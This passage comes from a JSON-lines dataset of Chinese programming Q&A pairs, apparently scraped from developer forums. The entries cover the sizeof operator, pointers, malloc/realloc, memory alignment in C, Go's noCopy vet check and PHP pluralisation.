NULL)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tprintf(\"%d\",tree-&gt;data);\r\n\tprintout(tree-&gt;left);\r\n\tprintout(tree-&gt;right);\r\n}\r\nint main()\r\n{\r\n\tTnode *tree = NULL;\r\n\tint i;\r\n\tint data;\r\n\t\r\n\tfor(i=0; i&lt;10; i++)\r\n\t{\r\n\t\tprintf(\"请输入数据%d：\",(i+1));\r\n\t\tscanf(\"%d\",&amp;data);\r\n\t\t//这里加上&amp;符号，否则的话tree一直是null导致输出孔\r\n\t\tinsert(&amp;tree,new_tnode(data));\r\n\t}\r\n\tprintf(\"输出数据：\\n\");\r\n\tprintout(tree);\r\n\treturn 0;\r\n}\r\n \r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["自己编的c语言建立二叉树的代码，运行时出错了，自己找不到错误，求大神帮忙，指点,急.", ["自己编的c语言建立二叉树的代码，运行时出错了，自己找不到错误，求大神帮忙，指点,急.", "\n\n", "#include", "\n#include", "\ntypedef struct tnode Tnode;", "\nstruct tnode", "\n{", "\n    Tnode *left;", "\n    Tnode *right;", "\n    int data;", "\n};", "\nTnode *new_tnode(int data)", "\n{", "\n    Tnode *new = malloc(sizeof(Tnode));", "\n    new->left=NULL;", "\n    new->right=NULL;", "\n    new->data=data;", "\n    return new;", "\n}", "\nvoid insert(Tnode *root,Tnode *tree)", "\n{", "\n    if(root==NULL)", "\n    {", "\n        tree=root;", "\n        return;", "\n    }", "\n    if(root->datadata)", "\n    {", "\n        tree->left=root;", "\n        insert(root,tree->left);", "\n    }", "\n    else if(root->data>tree->data)", "\n    {", "\n        tree->right=root;", "\n        insert(root,tree->right);", "\n    }", "\n}", "\nvoid printout(Tnode *tree)", "\n{", "\n    if(tree==NULL)", "\n    {", "\n        return;", "\n    }", "\n    printf(\"%d\",tree->data);", "\n    printout(tree->left);", "\n    printout(tree->right);", "\n}", "\nint main()", "\n{", "\n    Tnode *tree=NULL;", "\n    int i;", "\n    int data;", "\n    for(i=0;i<10;i++)", "\n    {", "\n        scanf(\"%d\",&data);", "\n        insert(new_tnode(data),tree);", "\n    }", "\n    printout(tree);", "\n\n", "return 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你传进去的是指针&amp;#xff0c;已经不能按照数组方法去计算大小啦&amp;#xff0c;望采纳&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于#c语言#的问题：自定义函数里面读取字符数组指针，然后我想要用sizeof(string)/sizeof(string[0]计算数组的长度", ["自定义函数里面读取字符数组指针，然后我想要用sizeof(string) / sizeof(string[0]计算数组的长度。然后我在主函数里面也打印了sizeof(string) / sizeof(string[0]，最后发现他们的结果不一样，这是为什么呀？", "\n", "#include <stdio.h>", "\n", "int", " ", "CountNumofLetter", "(", "char", "* ", "string", ")", "\n{\n    ", "int", " i = ", "0", ", count = ", "0", ";\n    ", "for", " (i = ", "0", "; i < ", "sizeof", "(", "string", ") / ", "sizeof", "(", "string", "[", "0", "]); i++)\n    {\n        ", "if", " (", "string", "[i] >= ", "'A'", " && ", "string", "[i] <= ", "'Z'", " || ", "string", "[i] >= ", "'a'", " && ", "string", "[i] <= ", "'z'", ")\n            count += ", "1", ";\n\n    }\n    printf(", "\"%d\\n\"", ", ", "sizeof", "(", "string", ") / ", "sizeof", "(", "string", "[", "0", "]));\n    ", "return", " count;\n}\n\n", "int", " ", "main", " (", ")", "\n{\n    ", "char", " ", "string", "[", "10", "] = ", "\"aaacv12AS\"", ";\n    printf(", "\"%d\\n\"", ", ", "sizeof", "(", "string", ") / ", "sizeof", "(", "string", "[", "0", "]));\n\n    printf(", "\"%d\"", ", CountNumofLetter( ", "string", "));\n    ", "return", " ", "0", ";\n\n}\n\n\n", "\n", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;可以啊&amp;#xff0c;可是&amp;#xff0c;可是&amp;#xff0c;可是&amp;#xff0c;兄弟&amp;#xff0c;你忘了写输出语句了啊.............................哭&lt;br /&gt;前面的sizeof都要改成printf啊&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["不可以直接用sizeof直接计算数据类型的大小吗", ["这样不可以吗？不能用sizeof来计算数据类型的大小吗?为什么输出什么都没有?这样写错了吗？"]], "Tag": "程序设计"}
{"Answer": "char joke[length + strnlen_s(preamble, sizeof(preamble)) + 1];\r\n这个写法，在一些编译器上可以，另一些不可以。gcc就可以。\r\n在不允许数组申明中使用变量的编译器，可以用malloc动态分配。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["以下代码怎样改正（C语言字符串问题）", [" #define STDC_WANT_LIB_EXT1 1\n#include <stdio.h>\n#include <string.h>\n\nint main(void)\n{\n    char preamble[] = \"The joke is:\\n\\n\";\n    char str[][40] = {\n                        \"My dog has\\'t got any nose.\",\n                        \"How does your dog smell then?\\n\",\n                        \"My dog smells horrible.\\n\"\n    };\n    unsigned int strCount = sizeof(str) / sizeof(str[0]);\n\n    unsigned int length = 0;\n    for (unsigned int i = 0; i < strCount; ++i)\n    {\n        length += strnlen_s(str[i], sizeof(str[i]));\n    }\n\n    **char joke[length + strnlen_s(preamble, sizeof(preamble)) + 1];**\n\n    if (strncpy_s(joke, sizeof(joke), preamble, sizeof(preamble)))\n    {\n        printf(\"Error copying preamble to joke.\\n\");\n        return 1;\n    }\n\n    for (unsigned int i = 0; i < strCount; ++i)\n    {\n        if (strncat_s(joke, sizeof(joke), str[i], sizeof(str[i])))\n        {\n            printf(\"Error copying string str[%u].\", i);\n            return 2;\n        }\n    }\n    printf(\"%s\", joke);\n    return 0;\n\n\n}\n\n\n\n", "\n\n", "错误信息：", "\n1>f:\\code\\c语言入门经典\\字符串和文本的应用\\joining_strings.c(21): error C2057: 应输入常量表达式", "\n1>f:\\code\\c语言入门经典\\字符串和文本的应用\\joining_strings.c(21): error C2466: 不能分配常量大小为 0 的数组", "\n1>f:\\code\\c语言入门经典\\字符串和文本的应用\\joining_strings.c(21): error C2133: “joke”: 未知的大小", "\n1>f:\\code\\c语言入门经典\\字符串和文本的应用\\joining_strings.c(23): warning C4034: sizeof 返回 0", "\n1>f:\\code\\c语言入门经典\\字符串和文本的应用\\joining_strings.c(31): warning C4034: sizeof 返回 0"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;&amp;amp; ( ~ (sizeof(long) - 1)); &lt;/span&gt;\n即 &lt;span class=\"hljs-meta\"&gt;&amp;amp; ~7&lt;/span&gt;\n这一段是用来对齐到&lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;字节&amp;#xff08;&lt;span class=\"hljs-number\"&gt;64&lt;/span&gt;bit&amp;#xff09;的\n如需要&lt;span class=\"hljs-number\"&gt;23&lt;/span&gt;字节&amp;#xff0c;对齐后就变成&lt;span class=\"hljs-number\"&gt;16&lt;/span&gt;字节&amp;#xff0c; &lt;span class=\"hljs-number\"&gt;23&lt;/span&gt; &lt;span class=\"hljs-meta\"&gt;&amp;amp; ~7 &amp;#61; 16&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&amp;#43; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;long&lt;/span&gt;) * &lt;span class=\"hljs-number\"&gt;32&lt;/span&gt;\n即 &amp;#43; &lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;\n这一段不是用来对齐的&amp;#xff0c;是预览内存空间\n用途&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;&amp;#xff1a;对齐后可能数值变小了&amp;#xff0c;需要加回去&amp;#xff08;如&lt;span class=\"hljs-number\"&gt;23&lt;/span&gt;对齐后变成了&lt;span class=\"hljs-number\"&gt;16&lt;/span&gt;&amp;#xff0c;至少要加&lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;&amp;#xff09;\n用途&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;&amp;#xff1a;可能其他代码用到了这么大的内存&amp;#xff08;*&lt;span class=\"hljs-number\"&gt;32&lt;/span&gt;还是*多少&amp;#xff0c;这个跟对齐没有关系&amp;#xff0c;是看其他用到的地方需要多大&amp;#xff09;\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言内存对齐代码不太理解", ["CPU位于IA32-E模式（64位模式，2MB分页）", "以下代码将内存管理结构的结束地址对齐并赋值给memory_management_struct.end_of_struct ，memory_management_struct.zones_struct是一个管理结构的起始地址，memory_management_struct.zones_length是结构总长(long的倍数)，想知道如下代码如何做到内存对齐？如何推导?", "我不太明白为什么要乘以32而不是64，按照我的理解应该是64因为一个long占8个字节也就是64个比特；", "之前问了几个关于内存对齐的代码，现在仍然感觉看得不是特别明白，想知道如何看懂这类代码？", "\n", "    memory_management_struct.end_of_struct = (", "unsigned", " ", "long", ")((", "unsigned", " ", "long", ")memory_management_struct.zones_struct + memory_management_struct.zones_length + ", "sizeof", "(", "long", ") * ", "32", ") & ( ~ (", "sizeof", "(", "long", ") - ", "1", "));    ", "////need a blank to separate memory_management_struct", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;选C吧&lt;br /&gt;char ca[3][5]是二维数组&amp;#xff0c;ca[0]就是第一行数组&amp;#xff0c;sizeof获得行长度就是第二维长度5&lt;br /&gt;pa[0]就是char*指针类型&amp;#xff0c;长度是4&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["计算机二级C语言考试sizeof", ["sizeof不是求字节大小吗？是不是ca二维数组中六个char每个占一个字节?加\\0共七个", "然后指针所占字节恒定为4"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Executive summary:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a)/sizeof(a[0]);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;To determine the size of your array in bytes, you can use the &lt;code&gt;sizeof&lt;/code&gt;\noperator:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;On my computer, ints are 4 bytes long, so n is 68.&lt;/p&gt;\n\n&lt;p&gt;To determine the number of elements in the array, we can divide\nthe total size of the array by the size of the array element.\nYou could do this with the type, like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a) / sizeof(int);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;and get the proper answer (68 / 4 = 17), but if the type of\n&lt;code&gt;a&lt;/code&gt; changed you would have a nasty bug if you forgot to change\nthe &lt;code&gt;sizeof(int)&lt;/code&gt; as well.&lt;/p&gt;\n\n&lt;p&gt;So the preferred divisor is &lt;code&gt;sizeof(a[0])&lt;/code&gt;, the size of the\nzeroeth element of the array.&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int a[17];\nsize_t n = sizeof(a) / sizeof(a[0]);\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Another advantage is that you can now easily parameterize\nthe array name in a macro and get:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;#define NELEMS(x)  (sizeof(x) / sizeof((x)[0]))\n\nint a[17];\nsize_t n = NELEMS(a);\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如何确定在 c 中的数组的大小？", ["\n\n", "How do I determine the size of my array in C? ", "\n\n", "That is, the number of elements the array can hold?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/37538/how-do-i-determine-the-size-of-my-array-in-c"]], "Tag": "程序设计"}
{"Answer": "指针的指针分配的内存是指针，而指针指向的内容还是没有分配，所以需要分配（或者用&amp;指向）指针的指针指向的内存", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言的指针问题以及解引指针", ["在《码农》第26期中看到这么一段代码，不解，烦请各位前辈指导指导。", "\n\n", "int *pi;\n*pi = (int*)malloc(sizeof(int));\n", "\n\n", "问题出在赋值符号的左边。在进行解引指针时，会把malloc函数返回的地址赋给pi中", "\n存放的地址所在的内存单元。如果这是第一次对指针进行赋值操作，那指针所包含的地址可能无效。正确的方法如下：", "\n\n", " pi  = (int*)malloc(sizeof(int));\n", "\n\n", "请解释下这段话的意思，以及什么叫做“解引指针”。", "\n\n", "如果代码是如下， 那又会如何", "\n\n", " int **pi;\n *pi = (int*)malloc(sizeof(int));\n", "\n\n", "如果定义的是指向指针的指针，这样是否也会出错呢？", "\n谢谢前辈们的讲解。"]], "Tag": "程序设计"}
{"Answer": "首先，原来的打印结果是-869060047-858993460-858993460\r\n                              不是-869060074-858993460-858993460\r\n\r\n如果要显示123，可以有以下方法：\r\n修改\"int data[3];\" 为\"char data[3];\", 原因是在读abc.txt时是按照数据类型读取，int型的读取大小是int*3,总共是12字节，每个int型占4字节(32bit编译环境下)，data的内容为0xcc333231，0xcccccccc，0xcccccccc注意数据存储大小尾，对应的就是-869060047-858993460-858993460，若改为char型，则读取大小是char*3，每个char占1字节，则总共占3字节，则数组data[i]的每个元素有一个字符，分别是字符“1”、“2”、“3”,查ascii码表可知对应的十进制码就是31、32、33。\r\n\r\n另代码在VS2015下正常运行，需要修改以下几行代码：\r\n1.“#include \"iostream.h\"”改为“#include &lt;iostream&gt;”原因是从VS2012开始向C++11标准靠拢，原来的写法编译通不过。\r\n2. 增加“using namespace std;”否则cout关键字无法识别。\r\n3. “if((fp=fopen(\"D:\\abc.txt\",\"r+\"))==NULL)”\r\n   改为:\r\n   “\tfopen_s(&amp;fp, \"D:\\\\abc.txt\", \"r+\");\r\n\t      if (fp  == NULL) ”\r\n   原因是fopen()函数改为fopen_s(),以符合C++11标准。\r\n   \"D:\\abc.txt\" -&gt; \"D:\\\\abc.txt\" 文件路径中的斜杠要用转义字符", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求教一个关于c++的问题", ["#include\"iostream.h\"", "\n#include\"stdio.h\"", "\n#include\"stdlib.h\"", "\nvoid main()", "\n{", "\n    FILE *fp;", "\n    int i;", "\n    int data[3];", "\n    if((fp=fopen(\"D:\\abc.txt\",\"r+\"))==NULL)", "\n    {", "\n        cout<<\"can't open file\\n\";", "\n        exit(1);", "\n    }", "\n    fread(data,sizeof(data),1,fp);", "\n    fclose(fp);", "\n    for(i=0;i<3;i++)", "\n        cout<<data[i];", "\n}", "\nabc.txt的内容是123，为什么运行结果不是显示123而是-869060074-858993460-858993460", "\n怎样改才能显示出123"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;指针变量里保存的是内存地址&amp;#xff0c;一个数字。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++结构体指针变量的内存申请", ["为结构体指针变量申请内存空间后，指针会有具体的数值吗？", "\n", " Link* a=(Link*)malloc(sizeof(Link));"]], "Tag": "程序设计"}
{"Answer": "```\r\nStudent *L;\r\nL=(Student *)malloc(sizeof(Student));\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于C语言里malloc的用法？", ["typedef int ElementType;", "\ntypedef struct Node{", "\n    ElementType data;", "\n    struct Node  *next;", "\n}Node, *LinkList;", "\n\n", "LinkList createList()", "\n{", "\n    LinkList L;", "\n    L=(LinkList)malloc(sizeof(Node));", "\n    L->next=NULL;", "\n    return L;", "\n\n", "} ", "\n\n", "typedef struct Student{", "\n\n", "......", "\n\n", "}Student；", "\nStudent* createList()", "\n{", "\n    Student ", "L;", "\n    L=(Student", ")malloc(sizeof(Student));", "\n    .......", "\n}", "\n\n", "这两个都是创建链表的函数,但不知其中malloc函数前后的两个括号里应该写什么，求教"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;下面是我的理解&amp;#xff0c;供参考&amp;#xff1a;&lt;br /&gt;用一个char指针保存description之前的值&amp;#xff0c;然后当description再次指向新的分配内存后&amp;#xff0c;如果内存分配失败&amp;#xff0c;就用fre&lt;br /&gt;e函数释放这个char指针指向的内存块。&amp;#xff08;参考&amp;#xff1a;C Primer Plus 第六版第399页 &amp;#xff09;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt; \n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n \n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n   &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; name[&lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;];\n   &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *description;\n \n   &lt;span class=\"hljs-built_in\"&gt;strcpy&lt;/span&gt;(name, &lt;span class=\"hljs-string\"&gt;&amp;#34;Zara Ali&amp;#34;&lt;/span&gt;);\n \n   &lt;span class=\"hljs-comment\"&gt;/* 动态分配内存 */&lt;/span&gt;\n   description &amp;#61; (&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;( &lt;span class=\"hljs-number\"&gt;30&lt;/span&gt; * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;) );\n   &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; * td &amp;#61; description;\n   &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;( description &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt; )\n   {\n      &lt;span class=\"hljs-built_in\"&gt;fprintf&lt;/span&gt;(stderr, &lt;span class=\"hljs-string\"&gt;&amp;#34;Error - unable to allocate required memory\\n&amp;#34;&lt;/span&gt;);\n   }\n   &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n   {\n      &lt;span class=\"hljs-built_in\"&gt;strcpy&lt;/span&gt;( description, &lt;span class=\"hljs-string\"&gt;&amp;#34;Zara ali a DPS student.&amp;#34;&lt;/span&gt;);\n   }\n  &lt;span class=\"hljs-comment\"&gt;// printf(&amp;#34;before td&amp;#61;%s\\n&amp;#34;,td);&lt;/span&gt;\n  \n   &lt;span class=\"hljs-comment\"&gt;/* 假设您想要存储更大的描述信息 */&lt;/span&gt;\n   description &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;&lt;span class=\"hljs-comment\"&gt;//(char *) realloc( description, 100 * sizeof(char) );//如果此处失败了&amp;#xff0c;怎样释放向前的30byte的内存呢&amp;#xff1f;&lt;/span&gt;\n   &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;( description &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt; )\n   {\n      &lt;span class=\"hljs-built_in\"&gt;fprintf&lt;/span&gt;(stderr, &lt;span class=\"hljs-string\"&gt;&amp;#34;Error - unable to allocate required memory\\n&amp;#34;&lt;/span&gt;);\n      &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(td);\n      &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;after td: %s\\n&amp;#34;&lt;/span&gt;, td );\n   }\n   &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n   {\n      &lt;span class=\"hljs-built_in\"&gt;strcat&lt;/span&gt;( description, &lt;span class=\"hljs-string\"&gt;&amp;#34;She is in class 10th&amp;#34;&lt;/span&gt;);\n   }\n   \n   &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Name &amp;#61; %s\\n&amp;#34;&lt;/span&gt;, name );\n   &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Description: %s\\n&amp;#34;&lt;/span&gt;, description );\n \n   &lt;span class=\"hljs-comment\"&gt;/* 使用 free() 函数释放内存 */&lt;/span&gt;\n   &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(description);&lt;span class=\"hljs-comment\"&gt;//如果重新分配失败了&amp;#xff0c;这里就没有地址值&amp;#xff0c;不能真正的释放已经分配的内存&lt;/span&gt;\n   &lt;span class=\"hljs-comment\"&gt;//printf(&amp;#34;Description: %s\\n&amp;#34;, description );&lt;/span&gt;\n\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在使用realloc()重新分配内存大小的时候失败了，怎样去释放更改前的内存？", ["\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "<string.h>", "\n \n", "int", " ", "main", "()", "\n", "{\n   ", "char", " name[", "100", "];\n   ", "char", " *description;\n \n   ", "strcpy", "(name, ", "\"Zara Ali\"", ");\n \n   ", "/* 动态分配内存 */", "\n   description = (", "char", " *)", "malloc", "( ", "30", " * ", "sizeof", "(", "char", ") );\n   ", "if", "( description == ", "NULL", " )\n   {\n      ", "fprintf", "(stderr, ", "\"Error - unable to allocate required memory\\n\"", ");\n   }\n   ", "else", "\n   {\n      ", "strcpy", "( description, ", "\"Zara ali a DPS student.\"", ");\n   }\n   ", "/* 假设您想要存储更大的描述信息 */", "\n   description = (", "char", " *) ", "realloc", "( description, ", "100", " * ", "sizeof", "(", "char", ") );", "//如果此处失败了，怎样释放向前的30byte的内存呢？", "\n   ", "if", "( description == ", "NULL", " )\n   {\n      ", "fprintf", "(stderr, ", "\"Error - unable to allocate required memory\\n\"", ");\n   }\n   ", "else", "\n   {\n      ", "strcat", "( description, ", "\"She is in class 10th\"", ");\n   }\n   \n   ", "printf", "(", "\"Name = %s\\n\"", ", name );\n   ", "printf", "(", "\"Description: %s\\n\"", ", description );\n \n   ", "/* 使用 free() 函数释放内存 */", "\n   ", "free", "(description);", "//如果重新分配失败了，这里就没有地址值，不能真正的释放已经分配的内存", "\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;First, copying locks is properly detected by &lt;code&gt;go vet&lt;/code&gt;. Example:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;type My struct {\n    l sync.Mutex\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Usage:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;func main() {\n    m := My{}\n    m2 := m\n    fmt.Println(m2)\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Running &lt;code&gt;go vet&lt;/code&gt;, the output is:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;./play.go:25: assignment copies lock value to m2: main.My contains sync.Mutex\n./play.go:26: call of fmt.Println copies lock value: main.My contains sync.Mutex\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;So both cases (assigning and passing to &lt;code&gt;fmt.Println()&lt;/code&gt;) were detected.&lt;/p&gt;\n\n&lt;p&gt;This also means that the easiest way to make your struct a target of vet when copied, simply add a field of type &lt;code&gt;sync.Mutex&lt;/code&gt;. This is a ready solution, although it consumes memory (&lt;code&gt;sync.Mutex&lt;/code&gt; is not a zero-size struct). It doesn't matter whether you use this mutex or not (we didn't use it in the example above).&lt;/p&gt;\n\n&lt;p&gt;In the discussion you referenced Rob Pike suggests to create a type:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;type noCopy struct{}\nfunc (*noCopy) Lock() {}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;And use a field of this type (either regular or embedded) to mark a struct non-copiable (and so make &lt;code&gt;go vet&lt;/code&gt; scream if that happens).&lt;/p&gt;\n\n&lt;p&gt;I don't know if this has ever worked, but currently it doesn't, because &lt;code&gt;go vet&lt;/code&gt; checks for the &lt;a href=\"https://golang.org/pkg/sync/#Locker\" rel=\"nofollow noreferrer\"&gt;&lt;code&gt;sync.Locker&lt;/code&gt;&lt;/a&gt; interface, which also has an &lt;code&gt;Unlock()&lt;/code&gt; method:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;type Locker interface {\n        Lock()\n        Unlock()\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;So if we create a &lt;code&gt;noCopy&lt;/code&gt; type that implements &lt;code&gt;sync.Locker&lt;/code&gt; (more precisely its pointer type), that will work:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;type noCopy struct{}\n\nfunc (*noCopy) Lock()   {}\nfunc (*noCopy) Unlock() {}\n\ntype By struct {\n    noCopy noCopy\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Testing it:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;func main() {\n    b := By{}\n    b2 := b\n    fmt.Println(b2)\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Running &lt;code&gt;go vet&lt;/code&gt;:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;./play.go:29: assignment copies lock value to b2: main.By contains main.noCopy\n./play.go:30: call of fmt.Println copies lock value: main.By contains main.noCopy\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Here are some changes related to &lt;code&gt;go vet&lt;/code&gt; and &lt;code&gt;noCopy&lt;/code&gt;:&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"https://golang.org/doc/go1.7#cmd_vet\" rel=\"nofollow noreferrer\"&gt;Go 1.7&lt;/a&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"https://golang.org/doc/go1.8#tool_vet\" rel=\"nofollow noreferrer\"&gt;Go 1.8&lt;/a&gt;&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Nocopy最小示例？", ["\n\n", "I've been trying to get a ", "noCopy", " directive to work for one of my own structs, but I cannot get ", "go vet", " to detect it. ", "\n\n", "I can get it to detect copying of ", "sync.WaitGroup", ", and ", "sync.Mutex", ", but not my own struct. ", "This test file", " in the vet source doesn't even trigger with my ", "go vet", ". ", "\n\n", "Or well, it finds some of the errors:", "\n\n", "# command-line-arguments\n./govet.go:56:6: no new variables on left side of :=\n./govet.go:110:17: unsafe.Sizeof(mu) evaluated but not used\n./govet.go:111:18: unsafe.Sizeof(mu) evaluated but not used\n./govet.go:112:10: unsafe.Sizeof(mu) evaluated but not used\n", "\n\n", "but the copylock detection doesn't find anything.", "\n\n", "Did something change in ", "go vet", " since ", "this discussion", " at 1.4? I'm running ", "go version go1.11 darwin/amd64", ".", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;If count is more than one echo \"s\".&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;&amp;lt;?php echo sizeof($ids); ?&amp;gt; Product &amp;lt;?php If(count($ids)&amp;gt;1) echo \"s\"; ?&amp;gt;&amp;lt;/strong&amp;gt;\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Or you make it easier to read like this:. &lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;If(count($ids)&amp;gt;1) {\n    Echo sizeof($ids) . \" Products.&amp;lt;/strong&amp;gt;\";\n}Else{\n    Echo sizeof($ids) . \" Product.&amp;lt;/strong&amp;gt;\";\n}\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如何在php中使用sizeof函数时正确使用复数？", ["\n\n", "When the page display results, I want it to say say ", "\"We found X products\"", " or ", "\"We found 1 Product\"", " rather than ", "\"we found 1 products\"", ".", "\n\n", "The relevant part of my current code is this:", "\n\n", "<?php echo sizeof($ids); ?> Products</strong>\n", "\n\n", "How could I extend it to behave more natural?", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你对func函数进行数组传参的时候&amp;#xff0c;实际上传过去的是数组的首元素地址&amp;#xff0c;所以你的func函数里的n其实是接收到的一个地址&amp;#xff0c;在64位系统之中一个地址的大小就是8个字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言sizeof()函数", ["如图，为什么同一个数组，一个是在主函数里输出sizeof(n)，一个是调用函数输出sizeof(n)，为何值会不一样", "\n", "\n", "求解！十分感谢！"]], "Tag": "程序设计"}
